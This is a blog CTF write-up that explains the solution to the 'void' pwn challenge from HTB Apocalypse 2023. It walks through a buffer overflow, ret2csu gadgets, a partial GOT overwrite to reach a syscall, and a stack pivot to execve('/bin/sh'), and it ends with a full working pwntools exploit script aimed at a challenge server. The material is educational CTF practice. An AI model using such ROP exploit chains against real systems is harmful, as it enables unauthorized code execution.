# Pwning the wrong way: Solving "void" from HTB Apocalypse 2023 CTF

During the last few days, I used some free time (not as much as I wanted!) to solve some pwn challenges from this year's **Apocalypse CTF**, which luckily lasted many days, so I was able to spare some time after work. I solved 8 out of 10 pwn challenges by myself, I had no time for the rest, but all of them looked fun.

## Why I'm doing this.

I was not thinking of writing any post for this year since all the challenges that I solved managed to use somehow techniques I already cover on this blog, or they are not that new to me, but I knew when I finished the challenge **Void** that the solution was probably not the intended one.

On a great chat on discord after the CTF, on a post by *Zopazz* with [writeups for all pwn challenges](https://github.com/Mymaqn/HTBCA2023_Pwn_Writeups), I realized there were a lot of people that came up with different solutions, not all of them were the *intended* some very cool like using a gadget that I didn't catch to *add* the offset from a pointer to a "one gadget", and some others similar to the one I came up. 

## The pretty way: ret2dlresolve with pwntools

I think the intended way for this challenge was to do a **ret2dlresolve**, as discussed by various pwners after the CTF.

ret2dlresolve is a technique  that targets the Dynamic Linker (dl) to resolve symbols in a shared library at runtime. The attack involves overwriting the return address of a vulnerable function with the address of a gadget that modifies the dl's internal state to load and execute a specified library function, such as system(), with user-controlled arguments. This usually allow us to bypass ASLR and it can be used fairly easily. You can find [more info about it here](https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/advanced-rop/ret2dlresolve/)

I never really put the time to understand how this technique is set up since it involves forging a fake *link_map*, and on other CTFs, I worked this around it without using it. (I just brute forced 1/16 the second byte of the GOT address to jump to other functions like *write()*) So I never needed to learn it.

There's also a class in _pwntools_ that would do all the magic if you use it, but I tend to stay away of pwntools wrappers, I feel confortable using them, like in the case  of *sigreturn, House of Orange, format strings* and others, but it is because I really learned the technique underneath, to understand it clearly before using them. Again I want to bring what was discuss after the ctf by the user *Zopazz* which make me feel not so bad since, we have pretty similar reasoning about the subject. 

**Zopazz: Personally since I've tried to learn the technique but never really understood it fully. I just don't use it. Which also forces me to use everything else in my arsenal of pwn knowledge. This imo makes it more fun n interesting too"**

Great quote!, I hope this will serve as an introduction to why I decided to solve this challenge the way I did it, and why I'm doing a write-up about it.

## Following along

If you want to follow along this post will reading you can use the original binaries located [here](https://github.com/dplastico/dplastico.github.io/blob/main/_posts/apoca2023/void.zip). 

## The ugly way: ret2csu + Stack Pivot + Syscalls.

So how did I solve this? Why is it so "ugly"? Well... Just because it's made the `lazy way,` and I was trying to be a little bit creative, Also I think it provides me good practice, I usually play CTFs to keep my skills sharp, so I try to stick to what I already know, and using it. With that into consideration, let's jump into the write-up to understand this thinking and also to learn a way t pwn this binary.

First, let's look at it using __checksec__.

```
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
    RUNPATH:  b'./glibc/'
```
The above shows us that the binary runs a libc from a custom folder provided (version __2.31__), no PIE or Canaries. The binary is tiny, and we have only one call to a function on the main function, as displayed on the pseudocode below.

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  vuln();
  return 0;
}
```

We can observe the call to the _vuln()_ function, and we can also inspect it to confirm it is just a read() function.

```c
ssize_t vuln()
{
  char buf[64]; // [rsp+0h] [rbp-40h] BYREF

  return read(0, buf, 0xC8uLL);                 // overflow
}
```

We can observe the comment added where a buffer overflow occurs. In this case, we have a 0x40 buffer called _buf_, and the read function is called. This function will read from _stdin_ to the _buf_ buffer, but it will read 0xc8, leaving us with a 0x88 buffer overflow.

Since the binary is tiny, there are only a few gadgets to work it. We will be able to control RDI, RSI, and RDX (the first 3 arguments a syscall Linux) due to ret2csu [ret2csu](https://i.blackhat.com/briefings/asia/2018/asia-18-Marco-return-to-csu-a-new-method-to-bypass-the-64-bit-Linux-ASLR-wp.pdf), and since we have a buffer overflow, we can use the read function as a _write-what-where_ primitive, since we can call it as many times as we want. How is that? The read function can be reached from _plt_. The binary has no _stack canaries_ or _PIE_, so we can overflow over and call read again, generating a 0x88 overflow.

Considering the above, a  _ROP chain_ sounds like the best way to approach it, but we have just a few gadgets. It's going to be hard to control all the registers to leak and then ROP to get a shell.

One of the cool things about doing challenges just for fun is that you come up with crazy ideas you can test since you are not worried about the time (A cool thing about Apocalypse since it last so long). Since previously I solved similar challenges by overwriting the _GOT_ and brute-forcing to a one gadget or system address, I realize in this case, since we only have a _read()_ function, we can only brute force to get a close address, _write()_ was possible for example, but it would be a pain to brute-force it just to leak. And then figure out the rest, so we could just overwrite the _LSB_ on the _read()_ at _GOT_ and see where that can take us.

Inspecting the _read()_ function in GDB, we can observe an interesting _syscall_ instruction.

```
0x00007ffff7ee1780 <+0>:	mov    eax,DWORD PTR fs:0x18
0x00007ffff7ee1788 <+8>:	test   eax,eax
0x00007ffff7ee178a <+10>:	jne    0x7ffff7ee17a0 <read+32>
0x00007ffff7ee178c <+12>:	syscall 
0x00007ffff7ee178e <+14>:	cmp    rax,0xfffffffffffff000
0x00007ffff7ee1794 <+20>:	ja     0x7ffff7ee17f0 <read+112>
0x00007ffff7ee1796 <+22>:	ret    
```

The instruction at address 0x00007ffff7ee178c is something we can reach by just overwriting the _GOT_ LSB to __0x8c__, since it is very close to the address of the function, in this case, __0x00007ffff7ee1780__, also if the syscall is successful there's a return right after allowing us to chain the syscall if necessary. After that, when we call _read()_ on _plt_, we execute the _syscall_ instruction. 

Great, so we have a cool plan. We can setup the registers using _ret2csu_ and then just call _execve()_... right? The answer is _NO_. 

We can't control the RAX register, at least not directly...There's still hope. The RAX register holds the return value of a function or syscall after it executes. So manipulating the return value of the _syscall_, we can use it to perform the desired call. And remember that the _syscall_ instructions have a return after? This means we can chain another _syscall_ so the former will return the desired value to propagate on RAX, and the ladder will execute the actual _syscall_.

The above sounds like a plan. We don't need an actual leak, we only need to return a controlled value using a syscall, but the issue is that when we overwrite the LSB of the _GOT_ address, the return value in RAX is set to 1, forcing us to _write()_ the syscall number 1. No problem then, this syscall returns the value of bytes written, so we can just write 0x3b bytes to anywhere, and this will set up RAX at the _execve()_ syscall number. We can then use ret2csu to set the rest of the register and call _execve()_ to get a shell.

Sounds too complicated? Well, maybe it is. Remember that we are doing this the __"ugly"__ way, not relying on pwntools wrappers. Let's analyze the exploit so we can have a better understanding of the details.

First, let's start by setting some variables that will help us along the way obviously you can just use the address. This is just a reference and personal naming preference.

```python
#gadgets
pops = 0x4011b2 #pop gadget from ret2csu pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret;
poprsi = 0x00000000004011b9 # pop rsi; pop r15; ret;
poprbp = 0x0000000000401109 # pop rbp; ret; 
poprdi = 0x00000000004011bb # pop rdi; ret;
rw_section = 0x404100 #in .bss
leaveret = 0x40115c # to pivot to .bss
fini_ptr = 0x403048
bss = 0x404030
ret2csu_gdg = 0x401198
```

Next, we will use the overflow to call _read()_ again. We will use an address on the _.bss_, since it has read and write permissions, in this case __0x404100__ to store the first _ROP chain_ 

```python
#1
payload = b"A"*0x48
#calling read() to write the 1st ROP chain ion the.bss section
payload += p64(poprdi)
payload += p64(0)
payload += p64(poprsi)
payload += p64(rw_section)
payload += p64(0xcafebabe)
payload += p64(elf.sym.read) # use the read function as write-what-where
payload += p64(elf.sym.vuln) # go back to the vul function to overflow again
```
Once the above payload is sent and the overflow is triggered, the  _read()_ function is executed, and we can write our payload, which will contain the _"/bin/sh"_ string and the ROP chain.

To understand the above, we need to be familiar with __ret2csu__. You can read more about it [here](https://gist.github.com/kaftejiman/a853ccb659fc3633aa1e61a9e26266e9), and practice it [here](https://ropemporium.com/challenge/ret2csu.html), but I will try to explain what's is the plan at a high level. We are using the following gadgets represented in the picture below showing the putput of the command __objdump -d void -M Intel__

![](https://github.com/dplastico/dplastico.github.io/raw/main/_posts/img/2023-03-24-13-13-39.png)

So first, we are using the  __pops__ gadget starting at 0x4011b2 at the end of the __libc_csu_init() function. This will allow us to control the gadgets poped, then we can use the gadget on the same functions. It is important to control RDX. Since we can pop r14 we can move it to RDX, but then as highlighted, we need to pass a call to a pointer on _[r15+rbx+8]_ since we want to just continue, we can use the _fini_ function also highlighted that has a _ptr_ on the address **0x403048** to this function, that basically "does nothing" as it can be observed, we should take care of the _RSP+8_ instruction setting a dummy value.

Considering the above we can write the follwoing _ROP chain_

```python
#storing the string /bin/sh
buf = b"/bin/sh\0"
#ret2csu
buf += p64(pops)
buf += p64(0) #rbx
buf += p64(1) #rbp
buf += p64(1) #r12 -> RDI
buf += p64(elf.got.read) #r13 = > rsi
buf += p64(0x3b) #r14 => RDX
buf += p64(fini_ptr) #r15

buf += p64(ret2csu_gdg) #
buf += p64(0xcafebabe) # dummy add rsp + 0x8
buf += p64(0) #rbx
buf += p64(1) #rbp
buf += p64(0) #r12
buf += p64(0) #r13 
buf += p64(0) #r14 
buf += p64(0) #r15
buf += p64(elf.sym.read) #syscall write()
buf += p64(poprbp)
buf += p64(rw_section+0x100) #second ROP chain
buf += p64(leaveret) #pivot
```
Since this _ROP chain_ will be used when the RAX register is set to 1, we must use the _write()_ syscall. The above will first set the value of RDX to 0x3b with the _pop r14_ instruction, using the _ret2csu_ technique, and then using the rest of the gadgets, we setup RDI to 1 using R12, and RSI is set to _GOT_ address of read() this actually was not important, but it will also provide a leak, that we will not use it :D

At the end, you can observe there's also a _pop rbp_ gadget that sets rbp to the address of the payload + 0x100. Here's where the next chain will be stored. Using then a _leave ret_ gadget, we can pivot to that place to continue execution.

Next, We will repeat the above to store the second _ROP chain_ that will contain the syscall to _execve()_ , since _vuln()_ was called again, we overflow to cal read this time to an offset 0x100 of our first chain, and we call vuln again for a 3rd call.

```python
payload = b"A"*0x48
#calling read() to write the 2nd ROP chain on the.bss section
payload += p64(poprdi)
payload += p64(0)
payload += p64(poprsi)
payload += p64(rw_section+0x100)
payload += p64(0xcafebabe)
payload += p64(elf.sym.read)
payload += p64(elf.sym.vuln)
```

Then we can setup the chain to call _execve()_.

```python
buf = b"YYYYYYYY" #padding
#ret2csu
buf += p64(pops)
buf += p64(0) #rbx
buf += p64(1) #rbp
buf += p64(rw_section) #r12 -> RDI /bin/sh
buf += p64(0) #r13 = > rsi 0
buf += p64(0) #r14 => RDX
buf += p64(fini_ptr) #r15

buf += p64(ret2csu_gdg) #
buf += p64(0xcafebabe) # dummy add rsp + 0x8
buf += p64(0) #rbx
buf += p64(1) #rbp
buf += p64(0) #r12
buf += p64(0) #r13 
buf += p64(0) #r14 
buf += p64(0) #r15
buf += p64(elf.sym.read) #syscall execve()
buf += p64(0xdeadbeef) #just as breakpoint.
```

Finally we are ready to execute all of the above overflowing a third time with the below.

```python
#3
payload = b"A"*0x48

payload += p64(poprdi)
payload += p64(0)
payload += p64(poprsi)
payload += p64(elf.got.read)
payload += p64(0xcafebabe)
payload += p64(elf.sym.read)

payload += p64(0x401109) #pop rbp
payload += p64(rw_section)
payload += p64(leaveret) #pivot

sleep(1)
r.sendline(payload)

sleep(1)
r.send(b"\x8c")

```
Above, we call read again, but this time after sending the payload, we just overwrite the LSB of the read() function in _GOT_ with 0x8c, allowing us to call _syscall_ every time we call read at _plt_. Finally, we use the same _leave ret_ gadget to pivot to the 1st chain and start the whole process described above.

We finalize obtaining a shell and the flag as below.

![](https://github.com/dplastico/dplastico.github.io/raw/main/_posts/img/2023-03-24-13-41-16.png)

## conclusion

This may seem like a really "not-smart" exercise to do, but for me that I enjoy doing ROP I think it's a great way to sharpen your skills and be creative, not always relying on automation.

I want to thank the CTF organizers and the people sharing their solutions and comments after the CTF on discord. 

## Final exploit

Here's the final exploit. It is not curated, so comments may contain misspellings and wrong descriptions.

```python
#!/usr/bin/python3
from pwn import *
gs = '''
continue
'''
elf = context.binary = ELF('./void')
libc = elf.libc

# config for tmux
#context.terminal = ['tmux', 'splitw', '-hp', '70']

def start():
    if args.GDB:
        return gdb.debug('./void', gdbscript=gs)
    if args.REMOTE:
        return remote('104.248.169.177', 30954)
    else:
        return process('./void')
r = start()
#========= exploit here ===================

#gadgets
pops = 0x4011b2 #pop gadget from ret2csu pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret;
poprsi = 0x00000000004011b9 # pop rsi; pop r15; ret;
poprbp = 0x0000000000401109 # pop rbp; ret; 
poprdi = 0x00000000004011bb # pop rdi; ret;
rw_section = 0x404100
leaveret = 0x40115c # to pivot to .bss
fini_ptr = 0x403048
bss = 0x404030
ret2csu_gdg = 0x401198

# 1 overflow
payload = b"A"*0x48
#calling read() to write the 1st ROP chain ion the.bss section
payload += p64(poprdi)
payload += p64(0)
payload += p64(poprsi)
payload += p64(rw_section)
payload += p64(0xcafebabe)
payload += p64(elf.sym.read)
payload += p64(elf.sym.vuln)

r.sendline(payload)

#payload 1 on  .bss
#storing the string /bin/sh
buf = b"/bin/sh\0"
#ret2csu
buf += p64(pops)
buf += p64(0) #rbx
buf += p64(1) #rbp
buf += p64(1) #r12 -> RDI
buf += p64(elf.got.read) #r13 = > rsi
buf += p64(0x3b) #r14 => RDX
buf += p64(fini_ptr) #r15

buf += p64(ret2csu_gdg) #
buf += p64(0xcafebabe) # dummy add rsp + 0x8
buf += p64(0) #rbx
buf += p64(1) #rbp
buf += p64(0) #r12
buf += p64(0) #r13 
buf += p64(0) #r14 
buf += p64(0) #r15
buf += p64(elf.sym.read) #syscall write()
buf += p64(poprbp)
buf += p64(rw_section+0x100) #second ROP chain
buf += p64(leaveret) #pivot

sleep(1)
r.sendline(buf)

# 2 overflow
payload = b"A"*0x48
#calling read() to write the 2nd ROP chain on the.bss section
payload += p64(poprdi)
payload += p64(0)
payload += p64(poprsi)
payload += p64(rw_section+0x100)
payload += p64(0xcafebabe)
payload += p64(elf.sym.read)
payload += p64(elf.sym.vuln)

sleep(1)
r.sendline(payload)

# 2payload 2 on .bss
buf = b"YYYYYYYY" #padding
#ret2csu
buf += p64(pops)
buf += p64(0) #rbx
buf += p64(1) #rbp
buf += p64(rw_section) #r12 -> RDI /bin/sh
buf += p64(0) #r13 = > rsi 0
buf += p64(0) #r14 => RDX
buf += p64(fini_ptr) #r15

buf += p64(ret2csu_gdg) #
buf += p64(0xcafebabe) # dummy add rsp + 0x8
buf += p64(0) #rbx
buf += p64(1) #rbp
buf += p64(0) #r12
buf += p64(0) #r13 
buf += p64(0) #r14 
buf += p64(0) #r15
buf += p64(elf.sym.read) #syscall execve()
buf += p64(0xdeadbeef)

sleep(1)
r.sendline(buf)

#3 overflow
payload = b"A"*0x48

payload += p64(poprdi)
payload += p64(0)
payload += p64(poprsi)
payload += p64(elf.got.read)
payload += p64(0xcafebabe)
payload += p64(elf.sym.read)

payload += p64(0x401109) #pop rbp
payload += p64(rw_section)
payload += p64(leaveret) #pivot

sleep(1)
r.sendline(payload)

sleep(1)
r.send(b"\x8c")

#========= interactive ====================
r.interactive()

```
